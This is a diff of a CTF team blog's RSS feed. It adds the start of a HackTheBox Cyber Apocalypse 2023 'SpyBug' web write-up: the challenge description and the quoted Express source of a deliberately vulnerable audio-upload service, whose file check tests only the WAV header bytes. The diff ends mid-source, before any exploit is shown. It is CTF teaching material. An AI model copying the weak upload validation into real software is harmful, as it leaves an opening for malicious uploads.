@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writeup | BKISC Blogs</title><link>https://blog.bkisc.com/tag/writeup/</link><atom:link href="https://blog.bkisc.com/tag/writeup/index.xml" rel="self" type="application/rss+xml"/><description>writeup</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Fri, 24 Mar 2023 00:05:00 +0000</lastBuildDate><image><url>https://blog.bkisc.com/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_300x300_fit_lanczos_3.png</url><title>writeup</title><link>https://blog.bkisc.com/tag/writeup/</link></image><item><title>Cyber Apocalypse 2023: The Cursed Mission - Forensics</title><link>https://blog.bkisc.com/blog/fazect/htb2023-forensics/</link><pubDate>Fri, 24 Mar 2023 00:05:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/htb2023-forensics/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writeup | BKISC Blogs</title><link>https://blog.bkisc.com/tag/writeup/</link><atom:link href="https://blog.bkisc.com/tag/writeup/index.xml" rel="self" type="application/rss+xml"/><description>writeup</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Fri, 24 Mar 2023 00:05:00 +0000</lastBuildDate><image><url>https://blog.bkisc.com/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_300x300_fit_lanczos_3.png</url><title>writeup</title><link>https://blog.bkisc.com/tag/writeup/</link></image><item><title>Cyber Apocalypse 2023: The Cursed Mission - Forensics</title><link>https://blog.bkisc.com/blog/fazect/htb2023-forensics/</link><pubDate>Fri, 24 Mar 2023 00:05:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/htb2023-forensics/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
 &lt;nav id="TableOfContents">
 &lt;ul>
@@ -452,7 +453,8 @@
 &lt;img src="2.png" alt="DIE" width="1000"/>
 &lt;p>Voilà, we get the executable! I used &lt;a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener">dnSpy&lt;/a> to read the code of the binary. Turned out, the flag is right there to be seen!&lt;/p>
 &lt;img src="3.png" alt="dnSpy" width="1000"/>
-&lt;p>Flag is: &lt;strong>HTB{0neN0Te?_iT'5_4_tr4P!}&lt;/strong>&lt;/p></description></item><item><title>HackTheBox CyberApocalypse 2023 - Web</title><link>https://blog.bkisc.com/blog/hoangdayne/htb_cyberapocalypse2023_web/</link><pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/hoangdayne/htb_cyberapocalypse2023_web/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;p>Flag is: &lt;strong>HTB{0neN0Te?_iT'5_4_tr4P!}&lt;/strong>&lt;/p></description></item><item><title>HackTheBox CyberApocalypse 2023 - Web</title><link>https://blog.bkisc.com/blog/hoangdayne/htb_cyberapocalypse2023_web/</link><pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/hoangdayne/htb_cyberapocalypse2023_web/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
 &lt;nav id="TableOfContents">
 &lt;ul>
@@ -469,7 +471,12 @@
 &lt;li>&lt;a href="#solution-1">Solution&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;/li>
-&lt;li>&lt;a href="#spybug-medium-coming-soon">SpyBug (medium) (coming soon)&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#spybug-medium">SpyBug (medium)&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#challenge-2">Challenge&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#solution-2">Solution&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
 &lt;li>&lt;a href="#traptrack-hard-coming-soon">TrapTrack (hard) (coming soon)&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;/nav>
@@ -805,8 +812,266 @@
 &lt;img src="dict2.png" alt="Payload"/>
 &lt;img src="dict3.png" alt="Admin panel demo"/>
 &lt;p>Flag: &lt;code>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}&lt;/code>&lt;/p>
-&lt;h2 id="spybug-medium-coming-soon">SpyBug (medium) (coming soon)&lt;/h2>
-&lt;h2 id="traptrack-hard-coming-soon">TrapTrack (hard) (coming soon)&lt;/h2></description></item><item><title>idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who</title><link>https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/</link><pubDate>Mon, 16 Jan 2023 03:50:54 +0000</pubDate><guid>https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/</guid><description>&lt;details class="toc-inpage d-print-none " open>
+&lt;h2 id="spybug-medium">SpyBug (medium)&lt;/h2>
+&lt;h3 id="challenge-2">Challenge&lt;/h3>
+&lt;p>&lt;strong>Given file:&lt;/strong>: &lt;a href="https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_spybug.zip" target="_blank" rel="noopener">Get it here&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Description&lt;/strong>: As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies. They had intercepted a communication from a rival treasure hunter who was working for the alien species. The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry&amp;rsquo;s communication channels. Can you hack into the portal and take down the aliens counter-spying operation?&lt;/p>
+&lt;h3 id="solution-2">Solution&lt;/h3>
+&lt;p>Right, another login panel with no reigster. But wait what&amp;rsquo;s that ? Look at the source code closely, we will have 2 main routes: &lt;code>routes/agents&lt;/code> and &lt;code>routes/main&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// agents.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">fs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;fs&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;path&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">uuidv4&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;uuid&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">express&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;express&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">router&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">express&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Router&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">multer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;multer&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">registerAgent&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">updateAgentDetails&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">createRecording&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./../utils/database&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">authAgent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;../middleware/authagent&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">storage&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">multer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">diskStorage&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">filename&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">cb&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">uuidv4&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">destination&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">cb&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;./uploads&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">multerUpload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">multer&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">storage&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">storage&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fileFilter&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mimetype&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;audio/wave&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">extname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">originalname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;.wav&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">cb&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">cb&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/agents/register&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">status&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">await&lt;/span> &lt;span class="nx">registerAgent&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/agents/check/:identifier/:token&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">authAgent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">post&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;/agents/details/:identifier/:token&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">authAgent&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">hostname&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">platform&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">arch&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">hostname&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">platform&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">arch&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">updateAgentDetails&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">params&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">identifier&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">hostname&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">platform&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">arch&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">post&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;/agents/upload/:identifier/:token&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">authAgent&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">multerUpload&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">single&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;recording&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">filepath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./uploads/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">buffer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">fs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">readFileSync&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">filepath&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">toString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hex&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">buffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/52494646[a-z0-9]{8}57415645/g&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">unlinkSync&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">filepath&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">createRecording&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">params&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">identifier&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">router&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// panel.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">express&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;express&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">router&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">express&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Router&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">checkUserLogin&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">getAgents&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">getRecordings&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./../utils/database&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">authUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;../middleware/authuser&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
